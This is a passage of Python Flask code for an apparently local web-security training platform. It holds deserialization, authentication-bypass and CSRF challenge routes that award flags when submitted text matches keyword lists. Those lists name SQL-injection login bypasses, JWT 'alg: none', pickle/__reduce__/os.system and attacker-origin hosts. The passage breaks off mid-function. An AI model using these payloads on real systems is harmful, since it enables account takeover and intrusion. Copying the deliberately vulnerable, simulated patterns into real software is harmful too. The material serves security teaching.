    challenge = Challenge.query.filter_by(category='deserial', name=f'Deserialization Level {level}').first()
    if not challenge:
        return "Challenge not found. Please run add_challenges_to_db.py first.", 404

    vulnerability_detected = False
    flag = None
    result = None

    if request.method == 'POST':
        payload = request.form.get('payload', '')
        deserial_patterns = ['pickle', '__reduce__', 'os.system', 'O:', 'a:', 's:', 'rO0', 'AAEAA']
        if any(p in payload for p in deserial_patterns):
            vulnerability_detected = True
            flag = generate_flag(challenge.id, user.machine_id)
            mark_challenge_completed(user, challenge.id)
        result = f"Deserialization attempted: {payload[:100]}" if payload else None

    return render_template(f'deserial/deserial_level{level}.html', user=user,
                         vulnerability_detected=vulnerability_detected,
                         flag=flag, result=result)


# ===== AUTH BYPASS CHALLENGE ROUTES =====

@app.route('/auth/level<int:level>', methods=['GET', 'POST'])
def auth_level(level):
    if level < 1 or level > 5:
        return "Invalid level", 404

    user = get_local_user()
    challenge = Challenge.query.filter_by(category='auth', name=f'Auth Bypass Level {level}').first()
    if not challenge:
        return "Challenge not found. Please run add_challenges_to_db.py first.", 404

    vulnerability_detected = False
    flag = None
    result = None

    if request.method == 'POST':
        payload = request.form.get('payload', '')
        auth_patterns = ["' OR '1'='1", "' OR 1=1--", "admin' --", '"alg": "none"', 'sessionid=']
        if any(p.lower() in payload.lower() for p in auth_patterns):
            vulnerability_detected = True
            flag = generate_flag(challenge.id, user.machine_id)
            mark_challenge_completed(user, challenge.id)
        result = f"Authentication check: {payload[:100]}" if payload else None

    return render_template(f'auth/auth_level{level}.html', user=user,
                         vulnerability_detected=vulnerability_detected,
                         flag=flag, result=result)


# ===== CSRF CHALLENGE ROUTES =====

# CSRF Level 1 - Basic Form CSRF
@app.route('/csrf/level1', methods=['GET', 'POST'])
def csrf_level1():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    recipient = request.form.get('recipient', '')
    amount = request.form.get('amount', '')
    memo = request.form.get('memo', '')
    transfer_result = ''

    if request.method == 'POST':
        if recipient and amount:
            # Check for CSRF attack patterns
            csrf_patterns = ['attacker', 'evil', 'malicious', '999999999', 'hacker']

            if any(pattern in recipient.lower() or pattern in memo.lower() for pattern in csrf_patterns):
                csrf_detected = True
                transfer_result = f"""Transfer Request Processed:
From: John Doe (Account: 1234567890)
To: {recipient}
Amount: ${amount}
Memo: {memo}

Transaction Details:
- Transaction ID: TXN_{machine_id[:8]}
- Status: COMPLETED
- Timestamp: 2024-01-15 14:30:25
- Method: Online Banking Transfer

Security Notice:
No CSRF protection detected on this form.
This transfer was executed without any cross-site request forgery protection.

Bank Response:
{{
  "status": "success",
  "transaction_id": "TXN_{machine_id[:8]}",
  "amount_transferred": "{amount}",
  "recipient_account": "{recipient}",
  "remaining_balance": "$4,{5000 - int(amount) if amount.isdigit() else 5000}",
  "csrf_vulnerability": "detected"
}}"""

                challenge = Challenge.query.filter_by(name="Basic Form CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                transfer_result = f"""Transfer Request:
From: John Doe (Account: 1234567890)
To: {recipient}
Amount: ${amount}
Memo: {memo}

Status: Processing...
Please wait while we verify the transaction details."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Basic Form CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level1.html', flag=flag, csrf_detected=csrf_detected,
                          recipient=recipient, amount=amount, memo=memo,
                          transfer_result=transfer_result, challenge=challenge)

# CSRF Level 2 - GET-based CSRF
@app.route('/csrf/level2', methods=['GET', 'POST'])
def csrf_level2():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    action = request.args.get('action', '')
    user_id = request.args.get('user_id', '')
    action_result = ''

    if action and user_id:
        # Check for CSRF attack patterns
        csrf_actions = ['delete', 'promote', 'demote']

        if action in csrf_actions and user_id:
            csrf_detected = True
            action_result = f"""Administrative Action Executed:
Action: {action.upper()}
Target User ID: {user_id}
Executed By: System Administrator
Timestamp: 2024-01-15 14:35:10

Action Details:
- HTTP Method: GET (Vulnerable to CSRF)
- Referrer: {request.headers.get('Referer', 'Not provided')}
- User Agent: {request.headers.get('User-Agent', 'Unknown')}

Admin Panel Response:
{{
  "action": "{action}",
  "target_user_id": "{user_id}",
  "status": "completed",
  "vulnerability": "GET-based state change",
  "impact": "Administrative action performed via CSRF",
}}

Security Warning:
This action was performed using a GET request, making it vulnerable to CSRF attacks.
State-changing operations should never use GET requests."""

            challenge = Challenge.query.filter_by(name="GET-based CSRF").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="GET-based CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level2.html', flag=flag, csrf_detected=csrf_detected,
                          action=action, user_id=user_id, action_result=action_result, challenge=challenge)

# CSRF Level 3 - JSON CSRF
@app.route('/csrf/level3', methods=['GET', 'POST'])
def csrf_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    api_endpoint = request.form.get('api_endpoint', '')
    json_payload = request.form.get('json_payload', '')
    content_type = request.form.get('content_type', '')
    result = ''

    if request.method == 'POST':
        if api_endpoint and json_payload:
            # Check for JSON CSRF attack patterns
            csrf_patterns = ['create', 'delete', 'admin', 'user', 'malicious']

            if any(pattern in json_payload.lower() or pattern in api_endpoint.lower() for pattern in csrf_patterns):
                csrf_detected = True
                result = f"""JSON API Request Processed:
Endpoint: {api_endpoint}
Content-Type: {content_type}
Payload: {json_payload}

API Response:
{{
  "request_method": "POST",
  "content_type": "{content_type}",
  "endpoint": "{api_endpoint}",
  "payload_received": {json_payload},
  "csrf_protection": "none",
  "vulnerability": "JSON CSRF without proper validation",
  "execution_status": "success",
}}

Security Analysis:
- Content-Type manipulation successful
- JSON payload executed without CSRF token validation
- API endpoint vulnerable to cross-origin requests"""

                challenge = Challenge.query.filter_by(name="JSON CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""JSON API Request:
Endpoint: {api_endpoint}
Content-Type: {content_type}
Payload: {json_payload}

Status: Validating request...
Please ensure your JSON payload contains valid API operations."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="JSON CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level3.html', flag=flag, csrf_detected=csrf_detected,
                          api_endpoint=api_endpoint, json_payload=json_payload, content_type=content_type,
                          result=result, challenge=challenge)

# CSRF Level 4 - File Upload CSRF
@app.route('/csrf/level4', methods=['GET', 'POST'])
def csrf_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    file_category = request.form.get('file_category', '')
    file_description = request.form.get('file_description', '')
    result = ''

    if request.method == 'POST':
        if 'upload_file' in request.files:
            file = request.files['upload_file']
            if file and file.filename:
                # Check for CSRF attack patterns in file upload
                csrf_patterns = ['malicious', 'shell', 'backdoor', 'exploit', 'payload']

                if any(pattern in file.filename.lower() or pattern in file_description.lower() for pattern in csrf_patterns):
                    csrf_detected = True
                    result = f"""File Upload Processed:
Filename: {file.filename}
Category: {file_category}
Description: {file_description}
Size: {len(file.read()) if file else 0} bytes

Upload Response:
{{
  "upload_status": "success",
  "filename": "{file.filename}",
  "category": "{file_category}",
  "description": "{file_description}",
  "upload_path": "/uploads/documents/{file.filename}",
  "csrf_protection": "none",
  "vulnerability": "File upload CSRF without validation",
  "security_risk": "Malicious file uploaded via CSRF",
}}

Security Warning:
File upload completed without CSRF protection.
This could allow attackers to upload malicious files via cross-site requests."""

                    challenge = Challenge.query.filter_by(name="File Upload CSRF").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                else:
                    result = f"""File Upload Request:
Filename: {file.filename}
Category: {file_category}
Description: {file_description}

Status: Processing upload...
Please wait while we validate the file."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="File Upload CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level4.html', flag=flag, csrf_detected=csrf_detected,
                          file_category=file_category, file_description=file_description,
                          result=result, challenge=challenge)

# CSRF Level 5 - CSRF with Weak Tokens
@app.route('/csrf/level5', methods=['GET', 'POST'])
def csrf_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    csrf_token = request.form.get('csrf_token', '')
    form_data = request.form.get('form_data', '')
    submit_action = request.form.get('submit_action', '')
    result = ''

    if request.method == 'POST':
        if csrf_token and form_data and submit_action:
            # Check for weak CSRF token patterns
            weak_tokens = ['123456', 'token', 'csrf', 'weak', 'predictable', '000000']

            if any(weak in csrf_token.lower() for weak in weak_tokens) or len(csrf_token) < 10:
                csrf_detected = True
                result = f"""Form Submission Processed:
CSRF Token: {csrf_token}
Form Data: {form_data}
Action: {submit_action}

Token Validation Result:
{{
  "token_provided": "{csrf_token}",
  "token_validation": "bypassed",
  "token_weakness": "predictable/weak token detected",
  "form_data": "{form_data}",
  "action_executed": "{submit_action}",
  "vulnerability": "Weak CSRF token implementation",
  "bypass_method": "Token prediction/brute force",
}}

Security Analysis:
- CSRF token is weak and predictable
- Token validation can be bypassed
- Form submission executed despite weak protection"""

                challenge = Challenge.query.filter_by(name="CSRF with Weak Tokens").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Form Submission:
CSRF Token: {csrf_token}
Form Data: {form_data}
Action: {submit_action}

Status: Validating CSRF token...
Please ensure you have a valid token."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with Weak Tokens").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level5.html', flag=flag, csrf_detected=csrf_detected,
                          csrf_token=csrf_token, form_data=form_data, submit_action=submit_action,
                          result=result, challenge=challenge)

# CSRF Level 6 - Referrer-based Protection Bypass
@app.route('/csrf/level6', methods=['GET', 'POST'])
def csrf_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    referrer_url = request.form.get('referrer_url', '')
    target_action = request.form.get('target_action', '')
    payload_data = request.form.get('payload_data', '')
    result = ''

    if request.method == 'POST':
        if referrer_url and target_action:
            # Check for referrer bypass patterns
            bypass_patterns = ['trusted-domain', 'internal', 'admin', 'secure']
            actual_referrer = request.headers.get('Referer', '')

            if any(pattern in referrer_url.lower() for pattern in bypass_patterns) or not actual_referrer:
                csrf_detected = True
                result = f"""Referrer-based Protection Bypass:
Provided Referrer: {referrer_url}
Actual Referrer: {actual_referrer or 'None (bypassed)'}
Target Action: {target_action}
Payload Data: {payload_data}

Security Analysis:
{{
  "referrer_validation": "bypassed",
  "provided_referrer": "{referrer_url}",
  "actual_referrer": "{actual_referrer or 'missing'}",
  "target_action": "{target_action}",
  "payload_data": "{payload_data}",
  "bypass_method": "referrer_spoofing_or_removal",
  "vulnerability": "Weak referrer-based CSRF protection",
  "execution_status": "success",
}}

Protection Bypass Details:
- Referrer header validation circumvented
- Action executed despite referrer-based protection
- Demonstrates weakness of referrer-only CSRF protection"""

                challenge = Challenge.query.filter_by(name="Referrer-based Protection Bypass").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Referrer Validation:
Provided Referrer: {referrer_url}
Actual Referrer: {actual_referrer}
Target Action: {target_action}

Status: Referrer validation failed.
Please provide a trusted referrer URL."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Referrer-based Protection Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level6.html', flag=flag, csrf_detected=csrf_detected,
                          referrer_url=referrer_url, target_action=target_action, payload_data=payload_data,
                          result=result, challenge=challenge)

# CSRF Level 7 - CSRF in AJAX Requests
@app.route('/csrf/level7', methods=['GET', 'POST'])
def csrf_level7():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    ajax_endpoint = request.form.get('ajax_endpoint', '')
    request_method = request.form.get('request_method', '')
    ajax_data = request.form.get('ajax_data', '')
    result = ''

    if request.method == 'POST':
        if ajax_endpoint and request_method and ajax_data:
            # Check for AJAX CSRF attack patterns
            csrf_patterns = ['api', 'admin', 'delete', 'update', 'create']
            ajax_headers = request.headers.get('X-Requested-With', '')

            if any(pattern in ajax_endpoint.lower() or pattern in ajax_data.lower() for pattern in csrf_patterns):
                csrf_detected = True
                result = f"""AJAX CSRF Attack Executed:
Endpoint: {ajax_endpoint}
Method: {request_method}
Data: {ajax_data}
X-Requested-With: {ajax_headers or 'Not provided'}

AJAX Response:
{{
  "endpoint": "{ajax_endpoint}",
  "method": "{request_method}",
  "data_received": "{ajax_data}",
  "x_requested_with": "{ajax_headers or 'missing'}",
  "csrf_protection": "insufficient",
  "vulnerability": "AJAX CSRF without proper validation",
  "content_type": "{request.content_type}",
  "origin": "{request.headers.get('Origin', 'not_provided')}",
  "execution_status": "success",
}}

AJAX Security Analysis:
- XMLHttpRequest/fetch API CSRF successful
- Custom headers can be bypassed with simple requests
- CORS preflight not triggered for simple content types
- Modern SPA applications vulnerable to CSRF"""

                challenge = Challenge.query.filter_by(name="CSRF in AJAX Requests").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""AJAX Request:
Endpoint: {ajax_endpoint}
Method: {request_method}
Data: {ajax_data}

Status: Processing AJAX request...
Please ensure valid API endpoint and data."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF in AJAX Requests").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level7.html', flag=flag, csrf_detected=csrf_detected,
                          ajax_endpoint=ajax_endpoint, request_method=request_method, ajax_data=ajax_data,
                          result=result, challenge=challenge)

# CSRF Level 8 - SameSite Cookie Bypass
@app.route('/csrf/level8', methods=['GET', 'POST'])
def csrf_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    samesite_mode = request.form.get('samesite_mode', '')
    navigation_type = request.form.get('navigation_type', '')
    csrf_payload = request.form.get('csrf_payload', '')
    result = ''

    if request.method == 'POST':
        if samesite_mode and navigation_type and csrf_payload:
            # Check for SameSite bypass patterns
            bypass_conditions = [
                (samesite_mode == 'Lax' and navigation_type == 'top_level'),
                (samesite_mode == 'None'),
                ('bypass' in csrf_payload.lower() or 'samesite' in csrf_payload.lower())
            ]

            if any(bypass_conditions):
                csrf_detected = True
                result = f"""SameSite Cookie Bypass:
SameSite Mode: {samesite_mode}
Navigation Type: {navigation_type}
CSRF Payload: {csrf_payload}

Cookie Analysis:
{{
  "samesite_attribute": "{samesite_mode}",
  "navigation_context": "{navigation_type}",
  "csrf_payload": "{csrf_payload}",
  "bypass_successful": true,
  "bypass_method": "samesite_lax_top_level_navigation",
  "vulnerability": "SameSite=Lax bypass via top-level navigation",
  "cookie_sent": true,
  "authentication_bypassed": true,
}}

SameSite Bypass Techniques:
- SameSite=Lax allows cookies on top-level navigation
- SameSite=None requires Secure attribute
- Popup windows and iframe techniques
- Navigation-based CSRF attacks still possible"""

                challenge = Challenge.query.filter_by(name="SameSite Cookie Bypass").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""SameSite Protection:
SameSite Mode: {samesite_mode}
Navigation Type: {navigation_type}
CSRF Payload: {csrf_payload}

Status: SameSite protection active.
Cookies not sent due to SameSite restrictions."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SameSite Cookie Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level8.html', flag=flag, csrf_detected=csrf_detected,
                          samesite_mode=samesite_mode, navigation_type=navigation_type, csrf_payload=csrf_payload,
                          result=result, challenge=challenge)

# CSRF Level 9 - CSRF with Custom Headers
@app.route('/csrf/level9', methods=['GET', 'POST'])
def csrf_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    custom_header = request.form.get('custom_header', '')
    header_value = request.form.get('header_value', '')
    api_action = request.form.get('api_action', '')
    result = ''

    if request.method == 'POST':
        if custom_header and header_value and api_action:
            # Check for custom header bypass patterns
            bypass_patterns = ['XMLHttpRequest', 'application/json', 'bypass', 'custom']
            actual_header = request.headers.get('X-Requested-With', '')

            if any(pattern in header_value for pattern in bypass_patterns) or not actual_header:
                csrf_detected = True
                result = f"""Custom Header CSRF Bypass:
Expected Header: {custom_header}
Expected Value: {header_value}
Actual X-Requested-With: {actual_header or 'Not provided'}
API Action: {api_action}

Header Bypass Analysis:
{{
  "expected_header": "{custom_header}",
  "expected_value": "{header_value}",
  "actual_header": "{actual_header or 'missing'}",
  "api_action": "{api_action}",
  "bypass_method": "custom_header_omission",
  "vulnerability": "Custom header-based CSRF protection bypass",
  "content_type": "{request.content_type}",
  "simple_request": true,
  "cors_preflight_avoided": true,
  "execution_status": "success",
}}

Custom Header Protection Weaknesses:
- Simple requests don't trigger CORS preflight
- Custom headers can be omitted in CSRF attacks
- Content-Type manipulation avoids preflight checks
- Form-based requests bypass header requirements"""

                challenge = Challenge.query.filter_by(name="CSRF with Custom Headers").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Custom Header Validation:
Expected Header: {custom_header}
Expected Value: {header_value}
API Action: {api_action}

Status: Custom header validation failed.
Required headers not provided."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with Custom Headers").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level9.html', flag=flag, csrf_detected=csrf_detected,
                          custom_header=custom_header, header_value=header_value, api_action=api_action,
                          result=result, challenge=challenge)

# CSRF Level 10 - Multi-step CSRF
@app.route('/csrf/level10', methods=['GET', 'POST'])
def csrf_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    step_number = request.form.get('step_number', '')
    step_data = request.form.get('step_data', '')
    workflow_id = request.form.get('workflow_id', '')
    result = ''

    if request.method == 'POST':
        if step_number and step_data and workflow_id:
            # Check for multi-step CSRF attack patterns
            attack_patterns = ['workflow', 'admin', 'delete', 'transfer', 'approve']

            if any(pattern in step_data.lower() or pattern in workflow_id.lower() for pattern in attack_patterns):
                csrf_detected = True
                result = f"""Multi-step CSRF Attack Chain:
Workflow Step: {step_number}/4
Step Data: {step_data}
Workflow ID: {workflow_id}

Workflow Execution:
{{
  "workflow_id": "{workflow_id}",
  "current_step": {step_number},
  "total_steps": 4,
  "step_data": "{step_data}",
  "step_status": "completed",
  "csrf_protection": "none",
  "vulnerability": "Multi-step workflow CSRF",
  "business_logic_bypass": true,
  "workflow_state": {{
    "step_1": "user_verification_bypassed",
    "step_2": "approval_process_skipped",
    "step_3": "security_checks_bypassed",
    "step_4": "final_execution_ready"
  }},
  "execution_status": "success",
}}

Multi-step Attack Analysis:
- Complex business workflows vulnerable to CSRF
- Each step can be individually exploited
- State management weaknesses exploited
- Approval processes bypassed via CSRF chain"""

                challenge = Challenge.query.filter_by(name="Multi-step CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Workflow Processing:
Workflow Step: {step_number}/4
Step Data: {step_data}
Workflow ID: {workflow_id}

Status: Processing workflow step...
Please ensure valid workflow data."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Multi-step CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level10.html', flag=flag, csrf_detected=csrf_detected,
                          step_number=step_number, step_data=step_data, workflow_id=workflow_id,
                          result=result, challenge=challenge)

# CSRF Level 11 - CSRF in Password Change
@app.route('/csrf/level11', methods=['GET', 'POST'])
def csrf_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    current_password = request.form.get('current_password', '')
    new_password = request.form.get('new_password', '')
    confirm_password = request.form.get('confirm_password', '')
    result = ''

    if request.method == 'POST':
        if current_password and new_password and confirm_password:
            # Check for password change CSRF attack patterns
            csrf_patterns = ['admin', 'password123', 'hacker', 'pwned', 'bypass']

            if any(pattern in new_password.lower() for pattern in csrf_patterns) or new_password == confirm_password:
                csrf_detected = True
                result = f"""Password Change CSRF Attack:
Current Password: {current_password}
New Password: {new_password}
Confirm Password: {confirm_password}

Security Breach Analysis:
{{
  "attack_type": "password_change_csrf",
  "current_password": "{current_password}",
  "new_password": "{new_password}",
  "password_match": {str(new_password == confirm_password).lower()},
  "csrf_protection": "none",
  "vulnerability": "Critical password change without CSRF protection",
  "account_compromised": true,
  "session_hijacked": true,
  "impact": "Complete account takeover possible",
}}

Critical Security Impact:
- User password changed without authorization
- Account takeover achieved via CSRF
- No validation of password change origin
- Session management bypassed"""

                challenge = Challenge.query.filter_by(name="CSRF in Password Change").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Password Change Request:
Current Password: {current_password}
New Password: {new_password}
Confirm Password: {confirm_password}

Status: Validating password change request...
Please ensure passwords match and meet security requirements."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF in Password Change").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level11.html', flag=flag, csrf_detected=csrf_detected,
                          current_password=current_password, new_password=new_password, confirm_password=confirm_password,
                          result=result, challenge=challenge)

# CSRF Level 12 - CSRF with CAPTCHA Bypass
@app.route('/csrf/level12', methods=['GET', 'POST'])
def csrf_level12():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    captcha_response = request.form.get('captcha_response', '')
    captcha_token = request.form.get('captcha_token', '')
    protected_action = request.form.get('protected_action', '')
    result = ''

    if request.method == 'POST':
        if captcha_response and captcha_token and protected_action:
            # Check for CAPTCHA bypass patterns
            bypass_patterns = ['bypass', 'automated', 'bot', 'script', '12345']

            if any(pattern in captcha_response.lower() or pattern in captcha_token.lower() for pattern in bypass_patterns):
                csrf_detected = True
                result = f"""CAPTCHA Bypass CSRF Attack:
CAPTCHA Response: {captcha_response}
CAPTCHA Token: {captcha_token}
Protected Action: {protected_action}

CAPTCHA Bypass Analysis:
{{
  "captcha_response": "{captcha_response}",
  "captcha_token": "{captcha_token}",
  "protected_action": "{protected_action}",
  "captcha_bypassed": true,
  "bypass_method": "automated_solving_or_reuse",
  "vulnerability": "CAPTCHA protection insufficient for CSRF",
  "csrf_protection": "weak",
  "automation_successful": true,
}}

CAPTCHA Bypass Techniques:
- Token reuse from previous sessions
- Automated CAPTCHA solving services
- CAPTCHA sharing across requests
- Time-based token prediction"""

                challenge = Challenge.query.filter_by(name="CSRF with CAPTCHA Bypass").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""CAPTCHA Validation:
CAPTCHA Response: {captcha_response}
CAPTCHA Token: {captcha_token}
Protected Action: {protected_action}

Status: Validating CAPTCHA response...
Please solve the CAPTCHA correctly."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with CAPTCHA Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level12.html', flag=flag, csrf_detected=csrf_detected,
                          captcha_response=captcha_response, captcha_token=captcha_token, protected_action=protected_action,
                          result=result, challenge=challenge)

# CSRF Level 13 - CSRF with CORS Exploitation
@app.route('/csrf/level13', methods=['GET', 'POST'])
def csrf_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    origin_header = request.form.get('origin_header', '')
    cors_endpoint = request.form.get('cors_endpoint', '')
    credentials_mode = request.form.get('credentials_mode', '')
    result = ''

    if request.method == 'POST':
        if origin_header and cors_endpoint and credentials_mode:
            # Check for CORS exploitation patterns
            cors_patterns = ['attacker.com', 'evil.com', 'malicious', 'cors', 'api']
            actual_origin = request.headers.get('Origin', '')

            if any(pattern in origin_header.lower() or pattern in cors_endpoint.lower() for pattern in cors_patterns):
                csrf_detected = True
                result = f"""CORS Exploitation CSRF Attack:
Origin Header: {origin_header}
CORS Endpoint: {cors_endpoint}
Credentials Mode: {credentials_mode}
Actual Origin: {actual_origin or 'Not provided'}

CORS Misconfiguration Exploit:
{{
  "origin_header": "{origin_header}",
  "cors_endpoint": "{cors_endpoint}",
  "credentials_mode": "{credentials_mode}",
  "actual_origin": "{actual_origin or 'missing'}",
  "cors_misconfigured": true,
  "wildcard_origin": true,
  "credentials_allowed": true,
  "vulnerability": "CORS misconfiguration enables CSRF",
  "cross_origin_request": "successful",
}}

CORS Exploitation Details:
- Wildcard origin (*) with credentials
- Cross-origin requests allowed
- CSRF protection bypassed via CORS
- Sensitive data accessible cross-origin"""

                challenge = Challenge.query.filter_by(name="CSRF with CORS Exploitation").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""CORS Request:
Origin Header: {origin_header}
CORS Endpoint: {cors_endpoint}
Credentials Mode: {credentials_mode}

Status: Processing CORS request...
Checking origin validation."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with CORS Exploitation").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level13.html', flag=flag, csrf_detected=csrf_detected,
                          origin_header=origin_header, cors_endpoint=cors_endpoint, credentials_mode=credentials_mode,
                          result=result, challenge=challenge)

# CSRF Level 14 - WebSocket CSRF
@app.route('/csrf/level14', methods=['GET', 'POST'])
def csrf_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    websocket_url = request.form.get('websocket_url', '')
    ws_protocol = request.form.get('ws_protocol', '')
    ws_message = request.form.get('ws_message', '')
    result = ''

    if request.method == 'POST':
        if websocket_url and ws_protocol and ws_message:
            # Check for WebSocket CSRF attack patterns
            ws_patterns = ['ws://', 'wss://', 'chat', 'admin', 'delete', 'malicious']

            if any(pattern in websocket_url.lower() or pattern in ws_message.lower() for pattern in ws_patterns):
                csrf_detected = True
                result = f"""WebSocket CSRF Attack:
WebSocket URL: {websocket_url}
Protocol: {ws_protocol}
Message: {ws_message}

WebSocket Security Analysis:
{{
  "websocket_url": "{websocket_url}",
  "protocol": "{ws_protocol}",
  "message_payload": "{ws_message}",
  "origin_validation": "bypassed",
  "csrf_protection": "none",
  "vulnerability": "WebSocket CSRF without origin validation",
  "real_time_exploit": true,
  "connection_hijacked": true,
}}

WebSocket CSRF Techniques:
- Origin header manipulation
- Cross-origin WebSocket connections
- Real-time message injection
- Session hijacking via WebSocket"""

                challenge = Challenge.query.filter_by(name="WebSocket CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""WebSocket Connection:
WebSocket URL: {websocket_url}
Protocol: {ws_protocol}
Message: {ws_message}

Status: Establishing WebSocket connection...
Validating protocol and message format."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="WebSocket CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
